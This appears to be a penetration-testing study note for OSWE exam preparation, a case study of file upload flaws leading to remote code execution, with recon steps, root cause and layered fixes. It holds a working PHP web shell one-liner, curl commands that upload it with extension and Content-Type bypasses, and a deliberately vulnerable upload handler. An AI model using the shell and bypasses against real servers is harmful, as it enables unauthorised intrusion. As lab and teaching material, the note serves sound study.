# File Upload to RCE Case Study

## Environment

- Host OS: Kali (attacker), Ubuntu 20.04 or Windows Server (target)
- VM/Docker: Custom PHP app or real course/HTB target (e.g. vulnerable upload handler in LAMP stack)
- App name/version: Generic web application with file upload functionality (PHP/ASP.NET common)
- Web URL: http://target:80/ or http://target:8080/
- Admin URL: Often /admin/ or /dashboard/ (upload may be in user profile or admin-only "themes/plugins")
- Key ports/services: 80/443 (HTTP), sometimes 21/22 for post-exfil
- Database: Usually present (MySQL/Postgres) but not required for pure upload RCE

**Typical lab setup**: Simple PHP `upload.php` with weak extension check + `move_uploaded_file` into webroot `/uploads/`, or full apps like old ATutor, WordPress with vulnerable plugin, or custom course targets.

## Recon

- Entry points:
  - Any `<input type="file">` form (profile picture, document import, avatar, theme upload, CSV/XML import, plugin install).
  - API endpoints accepting `multipart/form-data`.
  - "Import from URL" features that fetch and store files.
- Roles/privileges:
  - Low-priv or unauthenticated users (public registration + avatar).
  - Admin-only after a prior auth bypass, XSS in admin context, or SQLi that gives session.
- Render locations or sinks:
  - Files written to webroot subdirectories (`/uploads/`, `/files/`, `/images/`, `/themes/`, web root itself).
  - Later `include()`, `require()`, direct serving, or `file_get_contents()` on the stored path.
  - Response bodies that disclose the saved path or filename.

**Black-box indicators**:
- Upload succeeds for `.txt` but fails or renames for `.php`/`.aspx`.
- Error messages mentioning "extension", "MIME", "image only", "invalid file".
- Response after upload contains the original filename or a path.

## Vulnerability Hypothesis

- Suspected class: Insecure File Upload (CWE-434: Unrestricted Upload of File with Dangerous Type) leading to RCE.
- Data flow summary: Attacker-controlled file (name + content + headers) → weak server-side validation (extension list, Content-Type, basic magic) → file written to location inside or reachable from web root → web server executes the content (PHP parser, IIS handler, JSP container, etc.) when requested or included.
- Preconditions:
  - Upload functionality exists and accepts files from the attacker's privilege level.
  - Validation is insufficient (client-side, header-only, or incomplete allow-list).
  - Uploaded file lands in an executable context (webroot + correct extension for the handler, or includable via LFI/path traversal).

## Chain Outline

- Step 1: Locate upload endpoint and determine current filters (error messages, allowed extensions shown, response behavior on bad files).
- Step 2: Prepare weaponized file using bypass technique(s) — e.g. `shell.php.jpg` (double extension) + `Content-Type: image/jpeg` + optional GIF/JPEG magic bytes prefix.
- Step 3: Upload the file (multipart/form-data with correct field name).
- Step 4: Discover the final on-disk path (response disclosure, predictable `/uploads/`, brute common dirs, or second-order use of the filename).
- Step 5: Execute via direct request (`/uploads/shell.php.jpg?cmd=id`) or via another vuln (LFI that reaches the upload path).
- Step 6: Verify RCE (command output in response, marker file, OOB ping/callback, reverse shell).
- Step 7 (optional but common in exam): Use the shell to read source/configs, write a better backdoor, or chain into the next vulnerability on the machine.

## Evidence

- Screenshots: Upload request (filename, Content-Type, file content), successful response (path disclosure if any), shell execution showing `uid=33(www-data)` or `whoami` output.
- Logs: Web server access logs showing the GET to the shell with `?cmd=`, any upload handler logs.
- Artifacts: The actual uploaded file (if you can retrieve it), marker files created on target (`/tmp/pwned_by_<you>`), reverse shell connection.

## Findings

### Root Cause
The application fails to enforce that uploaded content can never be executed by the web server. This is usually a combination of:
- Insufficient extension validation (client-side, case-sensitive, or double-extension unaware).
- Trusting `Content-Type` from the client.
- Writing files into the web document root (or an includable directory) using (part of) the attacker-supplied filename.
- No content re-writing or sandboxing for user uploads.

**Classic vulnerable pattern (PHP)**:
```php
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($ext, ['jpg','png','gif'])) { die("bad"); }
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/".$_FILES['file']['name']);
```

Even a "better" check using `getimagesize()` can be defeated by prepending valid image magic bytes while keeping `<?php` in the file.

### Fix Idea (Layered)
1. **Never trust client data for name or type.** Generate a random safe filename (UUID + forced safe extension or no extension).
2. **Store uploads outside the web root** (e.g. `/var/www/uploads_private/`) and serve them only through a controlled download script that sets `Content-Disposition: attachment` + proper `X-Content-Type-Options: nosniff`.
3. **Validate + re-encode** for expected types (re-write images with GD/imagemagick, strip metadata).
4. **Use a strict server-side allow-list** of extensions and also validate magic bytes / MIME type server-side.
5. **Least privilege**: web user should not be able to write into any directory that the web server will execute code from.

### Open Questions (for deeper study)
- How does the app handle the case where the same filename is uploaded multiple times (overwrite vs. rename)?
- Is there a second-order path where the stored filename is later used in an `include` or file operation?
- Can you upload a `.phar` or serialized object and trigger it via a file operation elsewhere?
- Does the app support "upload from URL" that can be abused for SSRF + local file write?

## OSWE Exam Tips

- File upload is frequently the **last mile** of a chain. If you have any write capability (SQLi, deserial gadget that writes files, LFI write via PHP streams, etc.), immediately look for includable/ executable locations.
- Test the big three bypasses fast: double-extension + image content-type, pure content-type lie, magic-bytes + correct extension.
- Always inspect the full upload response for path disclosure — it saves minutes of guessing.
- In white-box: 30-second grep for `move_uploaded_file|$_FILES|PostedFile|MultipartFile` + trace the destination directory.
- Verification: Prefer direct output (`?cmd=whoami`). Use OOB ping or a marker file (`touch /tmp/you_got_me`) when output is not reflected.
- Time box: 10-15 minutes max to get a working shell from a known upload point. If filters are unusually strong, look for an alternative write vector.
- Reporting: Clearly state the bypass used, the final path on disk, and the exact request that achieved execution.

## Manual Quick Test (for any target)

```bash
# 1. Create shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# 2. Upload with common bypass (adjust field name and endpoint)
curl -F "file=@/tmp/shell.php;filename=shell.php.jpg;type=image/jpeg" \
     http://target/upload.php

# 3. Try to find it
curl http://target/uploads/shell.php.jpg?cmd=id
curl http://target/files/shell.php.jpg?cmd=id
# ... other common dirs
```

## References

- HackTricks File Upload: https://book.hacktricks.xyz/pentesting-web/file-upload
- PayloadsAllTheThings (Upload Insecure Files): https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- PortSwigger file upload labs
- HTB machines: Popcorn, Vault (and many others)
- This repo:
  - `poc-examples/file-upload-rce/` (full PoC + this Notes.md style lab manual)
  - `guides/File-Upload-to-RCE.md` (detailed methodology + bypass matrix + diagrams)
  - `guides/Code-Review-Checklists.md` (file operations section)
  - Roadmap (Week 6)
  - Related chains: Atmail XSS-to-RCE (contains upload step), various SQLi write + include examples

Copy `notes/CASE-template.md` and fill a fresh one whenever you encounter a new upload variant (different language, PHAR vector, chained with deserial, etc.).
